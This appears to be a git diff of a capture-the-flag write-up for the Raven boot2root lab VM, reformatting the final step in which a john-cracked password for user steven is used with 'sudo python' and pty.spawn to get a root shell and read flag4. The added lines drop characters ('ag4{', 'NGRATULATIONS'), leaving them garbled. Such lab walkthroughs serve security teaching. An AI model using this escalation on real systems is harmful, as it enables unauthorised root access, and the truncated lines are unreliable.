@@ -199,31 +199,15 @@ mysql> select * from wp_users;
 Was able to use 'john' to crack the password for Steven (pink84), and then use that to escalate privileges and fine flag4:
 
 > michael@target1:~$ su - steven
-Password:
-$ sudo python -c 'import pty;pty.spawn("/bin/bash")'        
-root@target1:/home/steven# cd /root
-root@target1:~# ls
-flag4.txt
-root@target1:~# cat flag4.txt
-______                      
-
-| ___ \                    
-
-| |_/ /__ ___   _____ _ __  
-
-|    // _` \ \ / / _ \ '_ \
-
-| |\ \ (_| |\ V /  __/ | | |
-
-\_| \_\__,_| \_/ \___|_| |_|
+> Password:
+> $ sudo python -c 'import pty;pty.spawn("/bin/bash")'        
+> root@target1:/home/steven# cd /root
+> root@target1:~# ls
+> flag4.txt
+> root@target1:~# cat flag4.txt
+> ______                      
 
 
-flag4{715dea6c055b9fe3337544932f2941ce}
+> ag4{715dea6c055b9fe3337544932f2941ce}
 
-CONGRATULATIONS on successfully rooting Raven!
-
-This is my first Boot2Root VM - I hope you enjoyed it.
-
-Hit me up on Twitter and let me know what you thought:
-
-@mccannwj / wjmccann.github.io
+> NGRATULATIONS on successfully rooting Raven!
